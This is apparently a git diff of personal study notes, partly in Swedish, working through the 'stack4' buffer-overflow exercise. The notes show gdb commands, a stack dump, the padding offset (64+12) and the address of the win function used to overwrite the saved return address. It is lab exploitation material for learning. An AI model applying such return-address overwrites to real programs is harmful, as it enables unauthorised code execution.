@@ -61,7 +61,7 @@ objdump -d ./stack4     -> Adress för win = 080483f4
 gdb ./stack4
 break main
 r < <(python -c 'print("A"*64)')
-info frame          -> Ger: saved eip 0xb7eadc76 
+info frame          -> Ger: saved eip 0xb7eadc76 , och att de är på loc:  ebp at 0xbffff7c8, eip at 0xbffff7cc
 // Printa stacken för att se vart saved eip är, och skriv över den med adressen till win
 x/24wx $esp    -> print stack
 0xbffff770:     0xbffff780      0xb7ec6165      0xbffff788      0xb7eada75
@@ -69,7 +69,7 @@ x/24wx $esp    -> print stack
 0xbffff790:     0x41414141      0x41414141      0x41414141      0x41414141
 0xbffff7a0:     0x41414141      0x41414141      0x41414141      0x41414141
 0xbffff7b0:     0x41414141      0x41414141      0x41414141      0x41414141
-0xbffff7c0:     0x08048400      0x00000000      0xbffff848      0xb7eadc76 <---------- Saved eip
+0xbffff7c0:     0x08048400      0x00000000      0xbffff848      0xb7eadc76 <---------- Saved eip (loc: 0xbffff7cc)
 // Saved eip, sparad instruktion till call main, skriv över den med adressen till win
 // Offset borde alltså vara: 64 + (4*3)
 // Adress för win = 080483f4, vilket är 4 bytes i decimalform: 244 131 4 8
